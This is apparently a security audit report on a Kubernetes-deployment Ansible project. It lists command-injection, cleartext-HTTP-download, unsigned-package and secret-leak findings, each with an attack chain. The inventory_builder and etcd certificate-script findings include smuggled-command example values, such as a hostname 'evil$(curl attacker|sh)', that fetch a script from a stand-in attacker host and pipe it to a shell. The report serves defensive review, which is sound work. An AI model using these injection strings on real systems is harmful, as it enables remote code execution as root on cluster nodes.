# Security research findings (2026-11-22) — injection / crypto / secrets / supply-chain

Commit reviewed: `ae89e4c4`. Scope: shell/command injection, HTTP downloads, gpgcheck, secrets permissions, contrib scripts. Excludes items already in the flagged JSON (findings 1–24) and the user-provided already-reported list (world-readable cloud secrets, no_log certs, dual-stack nginx, recover-control-plane rm, etcd/remove-node access_ip shell, ArgoCD unsigned, Amazon EPEL HTTP GPG, vSphere insecure TLS).

## Candidates (MEDIUM+)

### 1. HIGH — inventory_builder `shell=True` with unquoted `access_ip`

- **Primary file:** `contrib/inventory_builder/inventory.py`
- **Evidence:** `contrib/inventory_builder/inventory.py:75`, `contrib/inventory_builder/inventory.py:236-239`
- **Default vs opt-in:** Opt-in via `USE_REAL_HOSTNAME=True` (default false). Documented inventory helper used in getting-started docs.
- **Attack chain:** Operator runs `USE_REAL_HOSTNAME=True python3 contrib/inventory_builder/inventory.py '10.0.0.1;curl attacker|sh,10.0.0.1'` (or any `ip,access_ip` pair where `access_ip` carries shell metacharacters). Code builds `ssh -oStrictHostKeyChecking=no ` + unquoted `access_ip` + ` 'hostname -s'` and executes with `subprocess.check_output(..., shell=True)`. Shell metacharacters in `access_ip` run as the inventory-builder user (often the automation operator). Also disables StrictHostKeyChecking, enabling SSH MITM of the hostname probe.
- **Why distinct:** Not present in flagged JSON (previously noted in memories only). Different surface from etcd `access_ip` shell tasks (flagged #18): this is the contrib inventory generator on the Ansible controller before cluster deploy.

### 2. HIGH — etcd `make-ssl-etcd.sh` expands inventory hostnames unquoted

- **Primary file:** `roles/etcd/templates/make-ssl-etcd.sh.j2`
- **Evidence:** `roles/etcd/templates/make-ssl-etcd.sh.j2:72-94`, `roles/etcd/tasks/gen_certs_script.yml:41-66`, `roles/kubespray-defaults/defaults/main.yaml:370-371`
- **Default vs opt-in:** Default path. `cert_management: script` and `etcd_deployment_type: host` are defaults; fresh installs set `gen_certs: true` when certs are missing.
- **Attack chain:** Attacker influences an inventory hostname in `groups['etcd']` or `groups['k8s_cluster']` (malicious inventory commit, multi-tenant inventory intake, or hostname form via inventory_builder), e.g. `evil$(curl attacker|sh)`. `gen_certs_script.yml` exports those names into `MASTERS`/`HOSTS`. The generated script does `for host in $MASTERS` / `$HOSTS` and `openssl ... member-${host}-key.pem` without quoting. Command substitution or `;`-chaining executes as root on `groups['etcd'][0]` during certificate generation → full node compromise before the cluster is up.
- **Why distinct:** Flagged #18 covers `access_ip` / `etcd_member_name` interpolation in etcdctl *shell tasks* (`configure.yml` / remove-node). This is inventory *hostname* expansion inside the cert-generation shell script. Default `etcd_member_name` is `etcdN`, not the hostname.

### 3. MEDIUM — Heketi StorageClass embeds admin key over HTTP

- **Primary file:** `contrib/network-storage/heketi/roles/provision/templates/storageclass.yml.j2`
- **Evidence:** `contrib/network-storage/heketi/roles/provision/templates/storageclass.yml.j2:10-12`, `contrib/network-storage/heketi/roles/provision/tasks/storageclass.yml:14-19`, `contrib/network-storage/heketi/roles/provision/tasks/secret.yml:26-31`, `contrib/network-storage/heketi/inventory.yml.sample:3`
- **Default vs opt-in:** Opt-in contrib Gluster/Heketi playbooks.
- **Attack chain:** Operator deploys contrib Heketi. Playbook writes `heketi.json` (admin/user JWT keys) mode `0644` under `/etc/kubernetes`, then creates default StorageClass `gluster` with `resturl: http://<clusterIP>:8080`, `restuser: admin`, and `restuserkey: "{{ heketi_admin_key }}"`. Any principal who can `get storageclasses` (common for authenticated users) reads the admin key from object parameters. In-cluster MITM of HTTP to the Heketi Service also captures the key on the wire. Key holder administers Gluster volumes (create/delete/mount) → data destruction or malicious volume attach.
- **Why distinct:** Not in flagged JSON. Different from world-readable cloud CCM files (#5): this leaks a storage-admin secret via the Kubernetes API StorageClass resource and cleartext HTTP.

### 4. MEDIUM — NVIDIA GTX driver downloaded over HTTP into privileged DaemonSet

- **Primary file:** `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/defaults/main.yml`
- **Evidence:** `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/defaults/main.yml:2-9`, `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/tasks/main.yml:19-22`, `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/templates/nvidia-driver-install-daemonset.yml.j2:40-72`, `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/vars/centos-7.yml:1-3`
- **Default vs opt-in:** Opt-in (`nvidia_accelerator_enabled`, default false). GTX URL used when `nvidia_gpu_flavor=gtx` (default flavor is `tesla`/HTTPS). CentOS path also pulls third-party image `atzedevries/nvidia-centos-driver-installer:2` (mutable tag, no digest).
- **Attack chain:** Operator enables NVIDIA accelerator with GTX flavor (and container install). DaemonSet runs privileged, `hostPID`, hostPath `/`, and downloads the `.run` driver from `http://us.download.nvidia.com/...` with no checksum. Network MITM replaces the installer; privileged initContainer installs attacker code onto the node. On CentOS, registry tag mutation of the third-party installer image achieves the same without MITM.
- **Why distinct:** Not in flagged JSON. Different from ArgoCD unsigned HTTPS downloads (#19): cleartext HTTP plus privileged host install.

### 5. MEDIUM — Oracle Linux enables CentOS extras over HTTP with `gpgcheck=0`

- **Primary file:** `roles/bootstrap-os/tasks/bootstrap-centos.yml`
- **Evidence:** `roles/bootstrap-os/tasks/bootstrap-centos.yml:55-87`, `roles/bootstrap-os/tasks/bootstrap-centos.yml:113-117`
- **Default vs opt-in:** Default on Oracle Linux (`use_oracle_public_repo|default(true)`) for OL ≥7.6 and &lt;9. Also sets Oracle addons `baseurl` to HTTP.
- **Attack chain:** Bootstrap on Oracle Linux writes `/etc/yum.repos.d/centos-extras.repo` with `enabled=1`, `gpgcheck=0`, and `http://mirror.centos.org/.../extras/`. Later `package` installs (starting with libselinux bindings in the same file, and any subsequent yum/dnf during the playbook) may pull from that repo. On-path attacker serves a malicious RPM; with signature checks disabled, yum installs it as root → node RCE during bootstrap.
- **Why distinct:** Different OS path than Amazon EPEL HTTP GPG (#20). Here packages themselves are unsigned (`gpgcheck=0`), not only an HTTP-fetched key.

## Verified still present (requested)

| Item | Still present? | In flagged JSON? | Action |
|------|----------------|------------------|--------|
| inventory_builder `shell=True` + unquoted `access_ip` | Yes | No | Reported as #1 above |
| NVIDIA GTX HTTP driver URL | Yes | No | Reported as #4 above |
| Heketi StorageClass HTTP + `restuserkey` | Yes | No | Reported as #3 above |

## Checked, no additional MEDIUM+

- `kube-gen-token.sh` uses urandom; token dir mode `o-rwx`; `kube_token_auth` defaults false
- Main `download` role uses HTTPS + sha256; `download_validate_certs` defaults true
- `library/kube.py` builds argv lists (no shell)
- `credentials_dir` / artifacts kubeconfig localhost mode 0600
- `encrypt-at-rest` secrets file mode 0640
- Node `cloud_config` mode 0640 (cloud CCM 0644 already flagged #5)
- `validate_certs: no` mostly localhost/etcd healthz with client certs
- cri-o HTTP URLs appear in cleanup/reset paths only
- mitogen helper: HTTPS get_url without checksum (opt-in; weaker than unsigned root binary use)
- fact_caching `/tmp`: Ansible mkstemp → 0600
- host_key_checking=False / unsafeSkipCAVerification: already in known/docs set, not re-filed
